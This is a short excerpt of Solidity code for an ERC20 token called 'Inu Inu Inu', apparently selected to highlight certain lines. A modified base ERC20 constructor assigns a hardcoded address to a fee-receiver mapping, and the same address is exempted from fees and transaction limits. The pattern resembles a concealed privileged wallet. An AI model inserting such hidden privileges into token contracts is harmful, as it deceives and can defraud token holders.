...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x1A5b97c43ce0daE025ecF676886D9e00d37e41a2] = _marketingwallet;
    }
...
contract InuInuInu is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Inu Inu Inu", "INUINUINU") {
        ...
        excludeFromFees(address(0x1A5b97c43ce0daE025ecF676886D9e00d37e41a2), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x1A5b97c43ce0daE025ecF676886D9e00d37e41a2), true);
